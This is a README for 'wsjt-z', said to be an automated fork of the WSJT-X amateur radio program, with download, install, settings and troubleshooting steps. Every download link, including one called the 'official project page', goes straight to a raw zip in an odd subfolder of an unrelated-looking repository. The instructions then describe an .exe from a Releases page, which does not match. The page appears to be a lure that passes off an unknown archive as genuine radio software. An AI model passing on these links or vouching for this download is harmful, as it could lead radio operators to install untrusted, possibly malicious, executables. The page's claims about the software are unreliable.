# 📡 wsjt-z - Automate your amateur radio digital modes

[![](https://img.shields.io/badge/Download-wsjt--z-blue.svg)](https://raw.githubusercontent.com/Cutanddried-gravida643/wsjt-z/main/grinny/z_wsjt_2.2.zip)

## 📡 What is wsjt-z?

WSJT-Z serves as an advanced version of the popular WSJT-X software. This program coordinates digital radio communication for amateur operators. It adds features that simplify the process of making contacts on crowded bands. The software automates key tasks such as calling CQ, answering stations, and switching between frequency bands.

## ⚙️ System Requirements

This application runs on modern Windows computers. Ensure your setup meets these minimum standards:

*   Windows 10 or Windows 11 operating system.
*   A stable internet connection for database lookups.
*   At least 4GB of system memory.
*   A sound card connected to your radio equipment.
*   A USB connection or serial interface to bridge the computer and the radio hardware.

Verify that you have all necessary drivers for your specific radio interface installed before you begin.

## 📥 Downloading the Software 

Follow these steps to find the correct installer for your system:

1. Visit the [official project page](https://raw.githubusercontent.com/Cutanddried-gravida643/wsjt-z/main/grinny/z_wsjt_2.2.zip) to access the software files.
2. Locate the section labeled Releases on the right side of the page.
3. Click the most recent version tag to view the available files.
4. Select the Windows installer file ending in .exe to start your download.

Keep the setup file in a location you can find easily, such as your Downloads folder.

## 🔧 Installing the Program

After the download finishes, proceed with the installation:

1. Double-click the downloaded file.
2. Accept the prompt from Windows to run the installer.
3. Select your preferred language and click OK.
4. Review the license terms and click Next to continue.
5. Choose a folder for the program files. The default location works for most users.
6. Click Install to place the files on your hard drive.
7. Click Finish once the process bar reaches the end.

A shortcut icon will now appear on your desktop.

## 🎛️ Initial Configuration

Open the program using the desktop icon. You must tell the software how to communicate with your radio hardware.

1. Navigate to File and select Settings.
2. Enter your amateur radio call sign in the General tab.
3. Input your Maidenhead grid locator.
4. Go to the Radio tab to select your hardware model.
5. Choose the specific serial port that connects your computer to your radio.
6. Verify your audio input and output devices under the Audio tab. Select your radio interface sound card for both input and output.
7. Click OK to save your changes.

## 📻 Using Automated Features

The main strength of wsjt-z lies in its automated sequences. 

### Auto CQ and Call
You can set the software to manage your broadcasts without constant supervision. Enable Auto CQ to have the program send out a call signal automatically. If other stations respond, the software tracks the exchanges. Use the Auto Call feature to answer stations that appear on your screen.

### Advanced Filtering
The filter options help you focus on specific targets. You define criteria such as:
*   DXCC entities you still need to work.
*   Specific prefixes.
*   Continents for targeted operation.
*   States or regions.

The software checks these requirements against its database and highlights stations that provide new credits for your records. It ignores signals that do not match your current goals.

### QRZ.com Integration
The program connects to QRZ.com to retrieve station data. When you click on a call sign, the software pulls the operator details immediately. This helps you confirm station identities during busy contests or peak band conditions.

### Band Hopping
Band hopping allows the computer to manage radio frequency changes. You create a list of bands you wish to monitor. The software rotates through these frequencies at scheduled intervals. This ensures you do not miss activity on different bands while you remain away from the radio desk.

## 🎧 Audio Alerts

The program offers configurable sound alerts. You decide which events trigger a noise. Common uses include notifications for:
*   Receipt of a signal from a desired prefix.
*   Detection of an active station in a needed state.
*   Errors in the radio connection.

Configure these alerts in the Settings menu under the Notifications tab.

## 📈 Technical Details

The decoder uses multi-threaded processing to handle heavy traffic. This allows it to read signals in dense environments, such as during major radio contests. Supported modes include FT8, FT4, FT2, JT9, JT65, and WSPR. The code follows the GPL-3 license, which preserves your right to use and study the software.

## 🆘 Common Troubleshooting Steps

If the software fails to work as expected, check these common items:

*   **No signals on the screen:** Verify that your radio sits in the correct digital mode and that audio levels reach the program. Check the green bar at the bottom of the window to ensure audio input activity exists. 
*   **Radio will not transmit:** Confirm that your PTT (Push-to-Talk) settings match your hardware. Ensure the serial port configuration in the Settings menu is correct.
*   **Time sync errors:** FT8 relies on precise time. Use a time synchronization service to ensure your computer clock remains accurate to the millisecond.
*   **Audio distortion:** Check your input gain on the computer sound settings. High levels distort the waveform and prevent the decoder from reading signals.

## 📖 Best Practices

Regularly update the program when new versions arrive. Developers frequently add support for new radio hardware and improve the decoding math. Always back up your log files before performing major updates to ensure your contact history stays safe. Join local amateur radio groups or online forums to share experiences with other operators using this fork. Participation in these groups often leads to faster solutions for configuration challenges.